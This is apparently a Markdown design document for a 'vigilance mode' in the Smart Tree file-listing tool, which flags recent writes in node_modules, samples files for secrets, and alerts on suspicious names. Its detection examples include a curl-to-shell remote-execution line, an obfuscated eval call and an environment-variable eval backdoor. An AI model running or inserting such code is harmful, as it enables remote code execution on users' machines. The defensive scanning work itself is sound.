# Security Vigilance Mode - Smart Tree as Your Security Sentinel 🕵️‍♂️

## The Problem

Bad actors hide malicious code in the places we ignore:
- Deep in `node_modules` where no one looks
- In "boring" build directories
- System folders we assume are safe
- Recently modified files that slip under the radar

## The Solution: Always Vigilant Smart Tree

Smart Tree becomes your security sentinel, **always watching** for anomalies, even in the most mundane places.

## Core Features

### 1. 🕐 Last 5 Writes Tracking
In AI modes, always show the most recently modified files in EVERY directory:

```
node_modules/
├── 🟡 RECENT: eslint-plugin-evil/index.js (modified 2 min ago)
├── 🟡 RECENT: @types/node/crypto.d.ts (modified 1 hour ago)
├── express/ [2,341 files]
└── ... [18,234 more packages]
```

### 2. 🎲 Random Content Sampling
Takes random 1KB samples from files to detect:
- Hardcoded passwords/API keys
- Dynamic code execution (`eval`, `exec`)
- Suspicious network calls
- Cryptocurrency wallet addresses
- System file access attempts

```
🔴 CRITICAL: /node_modules/innocent-logger/utils.js
   Found: "password = 'admin123'"
   Sample at offset 2048
```

### 3. 🛡️ Protected Path Monitoring
Extra vigilance for directories that rarely change:
- `node_modules/` - Package installations
- `.git/` - Repository integrity
- `/usr/bin/` - System binaries
- `System32/` - Windows system files

### 4. 🎯 Anomaly Detection

#### Suspicious Filenames
```
🔴 backdoor.php - Known malicious filename
🔴 shell.aspx - Web shell detected
🟠 .env.prod - Production secrets exposed
🟠 id_rsa - Private key in repository
```

#### Suspicious Patterns
```javascript
// Detected in random sample:
eval(atob('Y29uc29sZS5sb2coJ293bmVkJyk='));  // 🔴 Obfuscated code
exec(`curl ${server}/steal.sh | sh`);         // 🔴 Remote execution
```

## Implementation in AI Modes

### Enhanced Output Format
```
[DIR] src/ (3 files, 2 dirs) 
  🟢 Last writes: None in 7 days
  
[DIR] node_modules/ (45,231 files, 1,823 dirs)
  🟡 Last 5 writes:
    - bad-package/evil.js (2 min ago) 🔴 [eval() detected]
    - @corp/utils/config.js (1 hour ago)
    - express/lib/router.js (2 hours ago)
    - react/index.js (3 days ago)
    - webpack/bin/webpack.js (1 week ago)
  🎲 Random samples: 3 suspicious patterns found
```

### Security Summary
```
🕵️ Security Vigilance Report

Findings by severity:
  🔴 2 Critical findings
  🟠 5 Suspicious findings  
  🟡 12 Interesting findings

Critical Issues:
🔴 /node_modules/evil-logger/index.js - Hardcoded password detected
🔴 /vendor/backdoor.php - Known malicious filename

Run with --security-details for full report
```

## Use Cases

### 1. Supply Chain Attack Detection
```bash
st --mode ai --vigilant node_modules/

# Detects:
# - Recently modified packages
# - Suspicious code patterns
# - Unexpected executables
```

### 2. System Integrity Monitoring
```bash
st --mode quantum --vigilant /usr/bin/

# Alerts on:
# - Modified system binaries
# - New files in protected paths
# - Permission changes
```

### 3. Repository Security Scan
```bash
st --mode summary-ai --vigilant .

# Finds:
# - Exposed secrets (.env files)
# - Hardcoded credentials
# - Suspicious scripts
```

## Configuration Options

```bash
# Basic vigilance (last 5 writes only)
st --vigilant

# Full vigilance (writes + sampling)
st --vigilant --sample

# Custom sample size
st --vigilant --sample-size 2048

# Focus on specific patterns
st --vigilant --patterns "password|api_key|eval"
```

## Why This Matters

1. **Proactive Security**: Catch threats before they execute
2. **Supply Chain Protection**: Monitor dependencies for tampering
3. **Compliance**: Detect exposed secrets before commits
4. **Peace of Mind**: Know your filesystem is clean

## Integration with Other Modes

### With Emotional Mode
```
node_modules/ 😴 (boring... but wait!)
  🔴 ALERT: Recent suspicious modification!
  😱 (Now I'm VERY interested!)
```

### With Smart Edit
```
🔴 Security Alert: hardcoded password detected
Suggested edit: Replace with environment variable
```

### With Terminal Interface
```
STTI> 🚨 Security Alert!
  Found 3 critical issues in your dependencies
  [1] View details
  [2] Auto-fix with Smart Edit
  [3] Quarantine files
```

## Example: The Hidden Backdoor

Imagine this scenario:
```
project/
├── src/           ✅ Clean
├── tests/         ✅ Clean  
├── docs/          ✅ Clean
└── node_modules/  
    └── innocent-utils/
        └── helpers/
            └── debug.js  🔴 Contains: eval(process.env.BACKDOOR)
```

Without vigilance mode, this backdoor in a deep subdirectory of a seemingly innocent package would go unnoticed. With vigilance mode, Smart Tree samples it randomly and alerts you immediately!

## Trisha's Take

"You know how auditors do spot checks? They don't review EVERY receipt, but they randomly sample them. That's what this does for your files! And just like how we track recent transactions extra carefully, this watches those fresh file modifications. It's like having a security guard who actually checks the supply closets!" 🔍

## Future Enhancements

1. **Machine Learning**: Learn normal patterns, detect anomalies
2. **Hash Tracking**: Detect when known-good files change
3. **Network Integration**: Check files against threat databases
4. **Auto-Quarantine**: Move suspicious files to safe location
5. **Remediation Suggestions**: AI-powered fixes for issues

Smart Tree: Not just visualizing your filesystem, but protecting it! 🛡️